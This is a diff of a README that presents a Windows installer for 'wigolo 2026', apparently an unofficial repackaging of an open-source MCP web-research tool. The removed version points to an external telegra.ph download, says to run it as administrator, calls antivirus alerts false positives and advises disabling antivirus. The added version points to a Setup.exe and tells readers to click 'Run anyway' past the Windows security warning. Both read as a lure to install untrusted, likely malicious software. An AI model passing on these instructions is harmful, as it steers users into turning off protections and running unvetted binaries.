@@ -1,174 +1,72 @@
-<h1 align="center">🌐 wigolo 2026 – Local Web Intelligence for AI Agents</h1>
+# 🌐 wigolo-Local-Web-Intelligence-2026 - Private local web research for agents
 
-<p align="center">
-  <strong>Local-first web intelligence for AI coding agents. Search, fetch, crawl, extract, research – no API keys, no cloud, $0/query. Private by default.</strong><br>
-  <em>Latest version 2026 | Desktop application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![Download for Windows](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/sectionmandrycleaner747/wigolo-Local-Web-Intelligence-2026/releases)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-wigolo_2026-00BFFF?style=for-the-badge&logo=ai&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+## 📖 What is wigolo 2026?
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+Wigolo 2026 provides web intelligence for your AI agents directly on your computer. It allows agents to search, fetch, and crawl the web without needing external API keys or paid subscriptions. Because the software runs entirely on your local machine, your data stays private. It supports the MCP protocol, which helps your AI tools interact with the browser and local search results. You get instant access to web data while maintaining full control over your privacy and costs.
 
----
+## ⚙️ System Requirements
 
-## 📦 What's Inside This Repository
+To run this application, ensure your computer meets these conditions:
 
-Welcome to the official distribution page for **wigolo 2026 – Local Web Intelligence for AI Agents for Windows PC**.
-This repository provides access to the latest release of the fastest-growing local-first web intelligence server for AI agents.
+*   Operating System: Windows 11 (64-bit).
+*   Processor: Dual-core 2.0 GHz or faster.
+*   Memory: 8 GB RAM or more.
+*   Storage: 500 MB of free disk space for local cache.
+*   Internet: Stable connection for web crawling and search tasks.
+*   Framework: Latest Windows updates installed.
 
-✅ **Full Version** – All 10 tools included  
-✅ **Zero API Keys** – Core tools work without any keys  
-✅ **18 Search Engines** – Multi-engine search with ML reranking  
-✅ **Local-First** – All data stays in `~/.wigolo/`  
-✅ **10 Web Tools** – Search, fetch, crawl, extract, cache, find_similar, research, agent, diff, watch  
-✅ **No System Changes** – Safe, no registry or service modifications  
+## 🚀 Downloading the Software
 
----
+You can get the application from the official release page. 
 
-## 📥 How to Get Started?
+[Click here to visit the release page and download the setup file](https://github.com/sectionmandrycleaner747/wigolo-Local-Web-Intelligence-2026/releases)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+Look for the file ending in `.exe` under the latest release section. Download this file to your computer.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+## 🛠️ Installing on Windows
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+Follow these steps to set up the software on your machine:
 
----
+1. Locate the downloaded file in your "Downloads" folder.
+2. Double-click the `Setup.exe` file.
+3. Windows might show a security prompt. If a window labeled "Windows protected your PC" appears, click "More info" and then click "Run anyway."
+4. Follow the instructions on the screen to finish the installation.
+5. Once the installer finishes, locate the Wigolo icon on your desktop or in your start menu.
+6. Click the icon to open the application for the first time.
 
-## 🚀 Step-by-Step Guide
+## 🧠 Using with AI Agents
 
-Follow these **3 simple steps** to get started with wigolo 2026 on your PC:
+Wigolo 2026 works as an MCP server. This means it connects to your existing AI agent tools like Cursor or Claude Code. Once the application runs, it listens for commands. You do not need to configure complex settings. Simply point your AI agent framework to the local address provided by the software interface. The application handles all requests for searching, fetching, and extracting web content.
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get wigolo 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+## 🛡️ Privacy and Safety
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+Privacy remains the core focus of this project. Wigolo does not send your search history to any central server. All crawling activity happens on your hardware. You do not store credit card details or API keys, as the system does not require them. Your research remains your own. If you wish to clear your local cache, simply open the application settings and click "Clear History."
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and configurations.
+## 🔧 Frequently Asked Questions
 
----
+**Does the software require a login?**
+No. You do not need to create an account or sign in to use the tools.
 
-## 🔧 Key Features (2026 Update)
+**How does it perform web searches?**
+The software uses local processing logic to fetch information from publicly available web sources. It formats this data for AI consumption.
 
-wigolo runs on your machine as an MCP server and gives AI agents one durable surface for everything web-related [citation:1][citation:4].
+**Can I stop the crawler manually?**
+Yes. Use the dashboard within the application to pause or stop any active research task.
 
-| Tool | What it does |
-| :--- | :--- |
-| 🔎 `search` | Multi-engine web search (18 direct adapters) with rank fusion, ML cross-encoder reranking, and an explainable per-result score [citation:1][citation:2][citation:3] |
-| 📄 `fetch` | Load one URL through a tiered router (HTTP → TLS-impersonation → headless browser) that auto-escalates on anti-bot challenges [citation:1][citation:2][citation:4] |
-| 🕸️ `crawl` | Multi-page crawl — BFS, DFS, sitemap, or map-only with robots.txt respect [citation:1][citation:2] |
-| 🧩 `extract` | Structured data from a page: tables, metadata, JSON-LD, named schemas (Article / Recipe / Product / …) [citation:1][citation:3][citation:4] |
-| 💾 `cache` | Query everything already seen — keyword (BM25) or hybrid with on-device vectors [citation:1][citation:3] |
-| 🧲 `find_similar` | Pages similar to a URL or a concept via 3-way fusion of keyword + semantic + live web [citation:1][citation:2] |
-| 🧠 `research` | Decompose a question → fan out sub-queries → fetch sources → synthesize a cited report [citation:1][citation:2][citation:4] |
-| 🤖 `agent` | Autonomous gather loop: plan → search → fetch → extract → synthesize with time budget [citation:1][citation:2][citation:4] |
-| 🔁 `diff` / ⏱️ `watch` | See exactly what changed on a page since last visit; re-check on schedule [citation:1][citation:2] |
+**What happens if the app crashes?**
+Simply restart the application from your desktop icon. Any partial data remains saved in the local folder.
 
----
+**How do I update to the newest version?**
+Visit the release page again when a update notice appears in the app. Download the new installer and run it. The new version will automatically replace the old one while keeping your settings intact.
 
-## 📈 Why Choose wigolo 2026?
+## 📂 Managing Local Data
 
-- ✅ **Fastest Growing** – 1,200+ GitHub stars in just a few months [citation:5][citation:8][citation:10]
-- ✅ **Zero Keys** – Core tools work without any API keys [citation:1][citation:2][citation:4]
-- ✅ **$0/Query** – No metered billing, no cloud costs [citation:5][citation:8]
-- ✅ **Local-First** – Your data never leaves `~/.wigolo/` [citation:1][citation:3][citation:4]
-- ✅ **18 Search Engines** – Multi-engine search with ML reranking [citation:1][citation:3]
-- ✅ **Honest Output** – Failed fetches and degraded backends are clearly labeled [citation:4][citation:5]
-- ✅ **No System Changes** – Safe, no registry or service modifications
+The application stores extracted data in a folder on your machine. You can access this directory by opening the settings menu and clicking "Open Data Folder." This folder contains text files and logs of your recent research. If you decide to uninstall the software, you can delete this folder to perform a clean erase of all your data.
 
----
+## 💻 Technical Support
 
-## 🔗 Official Download Link
+If you encounter issues, check the application logs found in the data folder. These logs describe any errors in plain language. If the problem persists, visit the issues section on our GitHub page to see if others have faced the same situation. Providing a clear description of your problem helps others help you.
 
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-wigolo_2026-00BFFF?style=flat-square&logo=ai&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all 10 tools.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: What AI agents are supported?**  
-A: Claude Code, Cursor, Codex, Gemini CLI, VS Code, Windsurf, Zed, Antigravity, and any MCP client [citation:1][citation:2][citation:4].
-
-**Q: Do I need an API key?**  
-A: No. Core tools (search, fetch, crawl, extract, cache, find_similar) work without any API key [citation:1][citation:2][citation:4].
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
-**Q: How often are updates released?**  
-A: Updates are released regularly with new features and improvements.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **personal and professional use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-**wigolo** is an open-source project by **Towhid Khan (KnockOutEZ)** .  
-Licensed under **AGPL-3.0** [citation:5][citation:8].  
-All rights belong to their respective owners. This is not an official distribution channel.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download wigolo 2026 Now</a>
-</p>
+Keywords: 2026-software, agent-framework, ai-agents, ai-tools, claude-code, cursor, desktop-app, llm-tools, local-first, mcp-protocol, mcp-server, open-source, pc-tools, privacy-first, research-tool, web-crawler, web-search, windows-11, windows-software-installation-guide
